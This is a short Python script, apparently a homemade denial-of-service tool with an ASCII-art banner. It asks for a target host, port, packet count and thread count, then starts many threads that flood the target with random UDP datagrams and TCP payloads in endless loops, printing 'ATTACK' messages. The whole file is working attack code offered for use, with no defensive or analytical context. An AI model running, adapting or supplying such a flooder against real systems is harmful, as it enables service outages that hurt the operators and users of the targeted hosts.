import random
import socket
import threading
import time
import os,sys

os.system('clear')
print("\033[0;36;40m")
print("""
██████╗░██╗░░░██╗██╗░░░██╗██╗░░░██╗
██╔══██╗╚██╗░██╔╝██║░░░██║██║░░░██║
██████╔╝░╚████╔╝░██║░░░██║██║░░░██║
██╔══██╗░░╚██╔╝░░██║░░░██║██║░░░██║
██║░░██║░░░██║░░░╚██████╔╝╚██████╔╝
╚═╝░░╚═╝░░░╚═╝░░░░╚═════╝░░╚═════╝░""")

ip = str(input("===] HOST/IP: "))
port = int(input("===] PORT HOST: "))
choice = str(input("=====] GASKEN : "))
times = int(input("===] PACKETS: "))
threads = int(input("===] THREADS: "))

os.system('clear')
def tools():
        data = random._urandom(811)
        while True:
                try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        addr = (str(ip),int(port))
                        for x in range(times):
                                s.sendto(data,addr)
                        print(f"ATTACK IP {ip} AND PORT {port}")
                except:
                        print(f"ATTACK IP {ip} AND PORT {port}")

def tools2():
        data = random._urandom(2015)
        while True:
                try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect((ip,port))
                        s.send(data)
                        for x in range(times):
                                s.send(data)
                        print(f"ATTACK IP {ip} AND PORT {port}")
                except:
                        s.close()
                        print(f"ATTACK IP {ip} AND PORT {port}")

for y in range(threads):
    if choice == 'y':
        th = threading.Thread(target = tools)
        th.start()
        th = threading.Thread(target = tools2)
        th.start()
